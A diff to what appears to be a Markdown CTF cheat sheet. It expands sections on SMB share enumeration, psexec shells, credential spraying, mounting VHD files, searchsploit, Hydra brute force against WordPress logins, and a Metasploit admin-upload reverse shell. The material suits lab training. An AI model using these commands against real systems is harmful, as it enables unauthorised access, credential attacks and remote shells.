@@ -423,95 +423,223 @@ cewl -a "Mozilla/5.0" -w wordlist.txt http://<HOST_IP>/
 - **Use `--with-numbers`** if the site includes numbers in words (e.g., `admin123`).
 
 
+---
 
-### SMB is Open
+### 📁 SMB is Open
 
-If SMB has misconfigured anonymous login, Use smbclient to list shares.
+When ports **139/445** are open, the target may be running **SMB (Server Message Block)**—commonly misconfigured in CTFs, making it a goldmine for enumeration and exploitation.
 
+---
+
+#### 🔍 Anonymous Share Enumeration
+```bash
+smbclient -L \\\\<HOST_IP>
 ```
-> $ smbclient -L \\\\<HOST_IP>
+Lists available shares. If successful without credentials, the server allows anonymous login.
+
+---
+
+#### 📂 Mounting SMB Share (Anonymous or Authenticated)
+```bash
+mkdir /mnt/smb
+mount -t cifs //<HOST_IP>/<SHARE> /mnt/smb/ -o guest
 ```
-
-If SMB Ports are open, we can look for anonymous login to mount misconfigured shares.
-
-```
-> $ mkdir /mnt/smb
-> $ mount -t cifs //<REMOTE_SMB_IP>/<SHARE> /mnt/smb/
-Password for root@//<HOST_IP>/<SHARE>: 
-```
- 
-If we found Administrator Credentials for SMB, Access the root shell using this method.
-
-```
-> $ /opt/impacket/examples# smbmap -u administrator -p password -H <HOST_IP>
-[+] Finding open SMB ports....
-[+] User SMB session establishd on <HOST_IP>...
-[+] IP: <HOST_IP>:445	Name: <HOST_IP>                                      
-	 Disk                                                  	Permissions
-	 ----                                                  	-----------
-	 ADMIN$                                            	READ, WRITE
-	 Backups                                           	READ, WRITE
-	 C$                                                	READ, WRITE
-	 IPC$                                              	READ ONLY
-  
-> $ /opt/impacket/examples# python psexec.py administrator@<HOST_IP>
-Impacket v0.9.21-dev - Copyright 2019 SecureAuth Corporation
-
-  Password:
-  [*] Requesting shares on <HOST_IP>.....
-  [*] Found writable share ADMIN$
-  [*] Uploading file tJJmcVQN.exe
-  [*] Opening SVCManager on <HOST_IP>.....
-  [*] Creating service RKAe on <HOST_IP>....
-  [*] Starting service RKAe.....
-  [!] Press help for extra shell commands
-  Microsoft Windows [Version 10.0.14393]
-  (c) 2016 Microsoft Corporation. All rights reserved.
-
-  C:\Windows\system32>
+Or use credentials:
+```bash
+mount -t cifs //<HOST_IP>/<SHARE> /mnt/smb/ -o username=<user>,password=<pass>
 ```
 
-### To Extract and Mount VHD Drive Files
+---
 
+#### 🔐 With Credentials – Using `smbmap`
+```bash
+smbmap -H <HOST_IP> -u administrator -p password
 ```
-> $ 7z l <FILENAME>.vhd
-7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
-p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,2 CPUs Intel(R) Core(TM) i5-5200U CPU @ 2.20GHz (306D4),ASM,AES-NI)
-Scanning the drive for archives:
-1 file, 5418299392 bytes (5168 MiB)
-Listing archive: <FILENAME>.vhd
+Enumerates shares, permissions, and access level.
 
-> $ guestmount --add <VHD_NAME>.vhd --inspector -ro -v /mnt/vhd
+---
+
+#### 🚀 Gaining Shell – Using `psexec.py`
+```bash
+python3 /opt/impacket/examples/psexec.py administrator@<HOST_IP>
 ```
+If credentials are valid and ADMIN$ is accessible, this will drop you into a SYSTEM shell.
 
-### To search for Exploits on Metasploit by Name
+---
 
-```
-> $ searchsploit apache 1.2.4
-```
+### 🎯 Pro Tips for CTFs:
 
-### Wordpress Open
-
-If `/wp-login.php` is found in the Enumeration scanning, it can be Wordpress site.
-
-To crack the login credentials for Wordpress, Use Hydra. We can use Burpsuite to capture the request parameters
-```
-> $ hydra -V -l wordlist.dic -p 123 <HOST_IP> http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid Username
+- **Use `enum4linux`** for a quick, detailed SMB sweep:
+```bash
+enum4linux -a <HOST_IP>
 ```
 
-To scan Wordpress site for Vulnerabilities.
+- **Look for backup files or password.txt in shares** like `Backups`, `Users`, or `C$`.
 
-```
-> $ gem install wpscan
-> $ wpscan --url <HOST_IP> --usernames <USERNAME_FOUND> --passwords wordlist.dic
+- **Use `smbclient` interactively** to explore shares:
+```bash
+smbclient \\\\<HOST_IP>\\Backups
+smb: \> ls
 ```
 
-To get a reverse shell using Admin Upload.
+- **Try null sessions (`-N`)**:
+```bash
+smbclient -L //<HOST_IP> -N
+```
 
+- **If `psexec.py` fails**, try `wmiexec.py`, `smbexec.py`, or `atexec.py` (from Impacket).
+
+- **Automate with tools like `crackmapexec`** for wide-scale credential spraying:
+```bash
+crackmapexec smb <HOST_IP> -u users.txt -p passwords.txt
 ```
-> $ msfconsole
-> $ use exploit/unix/webapp/wp_admin_shell_upload
+
+---
+
+### 💾 To Extract and Mount VHD Drive Files
+
+Virtual Hard Disk (VHD) files are often found in forensic or Windows-based CTF challenges. These can contain hidden flags, user profiles, or sensitive files.
+
+---
+
+#### 📦 List Contents of the VHD
+```bash
+7z l <FILENAME>.vhd
 ```
+Quickly inspects the archive to confirm structure before mounting.
+
+---
+
+#### 🔗 Mount VHD with Guestmount
+```bash
+guestmount --add <FILENAME>.vhd --inspector -ro -v /mnt/vhd
+```
+- `--inspector`: Auto-detects and mounts the correct partition.
+- `-ro`: Mounts as **read-only** (safe for analysis).
+- `-v`: Enables verbose output.
+
+Make sure `libguestfs-tools` is installed.
+
+---
+
+### 🎯 Pro Tips for CTFs:
+
+- **Always check for `.flag`, `.txt`, or `.zip` inside `Desktop`, `Downloads`, `Documents`.**
+- **Search for browser histories or credentials** in:
+  - `AppData/Roaming`
+  - `Users/<name>/Recent`
+- **If guestmount fails**, try manual partition detection:
+```bash
+fdisk -l <FILENAME>.vhd
+```
+Then mount using loop device:
+```bash
+mount -o ro,loop,offset=<OFFSET> <FILENAME>.vhd /mnt/vhd
+```
+- **Use `strings` or `binwalk`** to extract clues from within the VHD file:
+```bash
+strings <FILENAME>.vhd | grep flag
+```
+
+---
+
+### 🔍 To Search for Exploits on Metasploit by Name
+
+Use `searchsploit` to quickly find known exploits or vulnerabilities from the Exploit-DB repository.
+
+#### Basic Usage:
+```bash
+searchsploit apache 1.2.4
+```
+Searches for Apache version-specific exploits in the local database.
+
+---
+
+### 🎯 Pro Tips for CTFs:
+
+- **Use `-x` to open the exploit directly:**
+```bash
+searchsploit -x exploits/unix/remote/12345.txt
+```
+
+- **Mirror the database to ensure it’s up to date:**
+```bash
+searchsploit -u
+```
+
+- **Use quotes for precise matching:**
+```bash
+searchsploit "Apache 2.4.49"
+```
+
+- **Search inside PoCs for keywords (e.g., RCE, LFI):**
+```bash
+searchsploit --www | grep RCE
+```
+
+- **Search using CVE-ID if known:**
+```bash
+searchsploit CVE-2021-41773
+```
+
+- **For Metasploit directly:**
+```bash
+msfconsole
+> search type:exploit name:apache
+```
+
+---
+
+### 📰 WordPress Open
+
+If `/wp-login.php` is discovered during web enumeration, the target is likely running WordPress—a common and often vulnerable CMS in CTFs.
+
+---
+
+#### 🔑 Brute Force Login with Hydra
+```bash
+hydra -V -l admin -P wordlist.dic <HOST_IP> http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid username'
+```
+- Adjust `F=` string based on response for failed login.
+- Capture login POST parameters using **Burp Suite**.
+
+---
+
+#### 🔎 Scan for Plugins, Themes, and Vulnerabilities with WPScan
+```bash
+gem install wpscan
+wpscan --url http://<HOST_IP> --enumerate u,vt,tt,cb,dbe --plugins-detection aggressive
+```
+- Use with credentials:
+```bash
+wpscan --url http://<HOST_IP> --usernames admin --passwords wordlist.dic
+```
+
+---
+
+#### 🐚 Reverse Shell via Admin Upload (Metasploit)
+```bash
+msfconsole
+use exploit/unix/webapp/wp_admin_shell_upload
+set RHOST <HOST_IP>
+set USERNAME admin
+set PASSWORD <password>
+run
+```
+
+---
+
+### 🎯 Pro Tips for CTFs:
+
+- **Check `/readme.html` or `wp-includes/version.php`** for WordPress version leakage.
+- **Always enumerate users first** to reduce brute force attempts:
+```bash
+wpscan --url http://<HOST_IP> --enumerate u
+```
+- **Scan for outdated plugins/themes**—they’re frequent attack vectors.
+- **Look for writable upload directories or `eval()` usage** in plugin files.
+- **Try LFI/SQLi on lesser-known plugins** if source code or version is known.
+
 
 ### RPC Open
 
